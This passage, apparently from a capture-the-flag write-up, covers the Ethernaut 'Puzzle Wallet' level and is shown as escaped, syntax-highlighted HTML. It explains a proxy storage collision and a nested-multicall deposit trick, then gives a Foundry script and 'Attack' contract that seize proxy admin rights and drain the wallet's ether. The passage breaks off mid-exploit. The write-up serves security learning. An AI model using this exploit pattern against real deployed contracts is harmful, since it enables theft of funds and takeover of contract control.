&lt;&#x2F;span&gt;&lt;span&gt;            (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(data[i])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Error while delegating call&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;You&#x27;ll need to hijack this wallet to become the admin of the proxy.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;PuzzleProxy is a proxy contract and PuzzleWallet is an implementation contract.&lt;&#x2F;li&gt;
&lt;li&gt;Calls to PuzzleProxy will be forwarded to the PuzzleWallet through delegatecall.&lt;&#x2F;li&gt;
&lt;li&gt;Recall that &lt;code&gt;delegatecall&lt;&#x2F;code&gt; updates the storage of the caller contract. So, the storage layout should not possess any collisons.&lt;&#x2F;li&gt;
&lt;li&gt;Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.&lt;&#x2F;li&gt;
&lt;li&gt;Lets understand the goal of the challenge. We need to become the admin of the proxy contract.&lt;&#x2F;li&gt;
&lt;li&gt;We can propose a new admin which will update the &lt;code&gt;pendingAdmin&lt;&#x2F;code&gt; variable in PuzzleProxy as well as the &lt;code&gt;owner&lt;&#x2F;code&gt; inside PuzzleWallet. Because of storage collision.&lt;&#x2F;li&gt;
&lt;li&gt;Then call the &lt;code&gt;addToWhiteList()&lt;&#x2F;code&gt; with our Attacker address to be able to call other functions of PuzzleWallet.&lt;&#x2F;li&gt;
&lt;li&gt;To override the &lt;code&gt;admin&lt;&#x2F;code&gt; variable in PuzzleProxy contract we have to change the &lt;code&gt;maxPrice&lt;&#x2F;code&gt; variable to address of our Attacker.&lt;&#x2F;li&gt;
&lt;li&gt;To update &lt;code&gt;maxPrice&lt;&#x2F;code&gt; we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the &lt;code&gt;execute()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;If we somehow able to pass this &lt;code&gt;require(balances[msg.sender] &amp;gt;= value, &quot;Insufficient balance&quot;);&lt;&#x2F;code&gt; check we can withdraw more ether from wallet.&lt;&#x2F;li&gt;
&lt;li&gt;To do so, we need to send 0.001 ether only to the wallet, but we need to update the &lt;code&gt;balance[msg.sender]&lt;&#x2F;code&gt; to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.&lt;&#x2F;li&gt;
&lt;li&gt;We can use the &lt;code&gt;multicall()&lt;&#x2F;code&gt; function to do this, we call the &lt;code&gt;multicall()&lt;&#x2F;code&gt; with 0.001 ether and pass the function signature of the &lt;code&gt;deposit()&lt;&#x2F;code&gt; so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.&lt;&#x2F;li&gt;
&lt;li&gt;We cant call &lt;code&gt;deposit()&lt;&#x2F;code&gt; twice in a single call by passing calldata as [signature of &lt;code&gt;deposit&lt;&#x2F;code&gt; + signature of &lt;code&gt;deposit&lt;&#x2F;code&gt;]. As there is a check to catch this case.&lt;&#x2F;li&gt;
&lt;li&gt;But we can send the singature of the &lt;code&gt;deposit()&lt;&#x2F;code&gt; and a call to &lt;code&gt;multicall()&lt;&#x2F;code&gt; again with the &lt;code&gt;deposit()&lt;&#x2F;code&gt; signature.&lt;&#x2F;li&gt;
&lt;li&gt;That is we are calling multicall with a &lt;code&gt;deposit()&lt;&#x2F;code&gt; calldata along with multicall calldata with &lt;code&gt;deposit()&lt;&#x2F;code&gt; signature. i.e, a nested multicall.&lt;&#x2F;li&gt;
&lt;li&gt;This will modify the &lt;code&gt;balance[msg.sender]&lt;&#x2F;code&gt; twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.&lt;&#x2F;li&gt;
&lt;li&gt;Now we have enough &lt;code&gt;balance[msg.sender]&lt;&#x2F;code&gt; to pass the check done in &lt;code&gt;execute()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes zero.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;PuzzleWalletSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;PuzzleWallet.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PuzzleWalletSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    PuzzleProxy public proxy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PuzzleProxy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    PuzzleWallet public wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PuzzleWallet&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Owner  :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Proxy Admin :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;admin&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Max Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;maxBalance&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Proxy Pending Admin : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;pendingAdmin&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(wallet)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;exploit{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Owner  :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Proxy Admin :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;admin&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Max Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;maxBalance&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Proxy Pending Admin : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;pendingAdmin&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(wallet)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
&lt;&#x2F;span&gt;&lt;span&gt;    PuzzleProxy public proxy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PuzzleProxy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    PuzzleWallet public wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PuzzleWallet&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        proxy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;proposeNewAdmin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Changes pendingAdmin in Proxy and overwrites owner in Wallet
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addToWhitelist&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; To set maxPrice ==&amp;gt; Wallet Balance should be 0, But Initiall Wallet Balance : 1000000000000000 (0.001 ETH)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Make Wallet Balance 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; use multicall to call deposit and multicall again with 0.001 eth
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes[] memory _depositSelector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _depositSelector[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;deposit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;selector)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        bytes[] memory _nestedMulti &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _nestedMulti[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;deposit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;selector)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
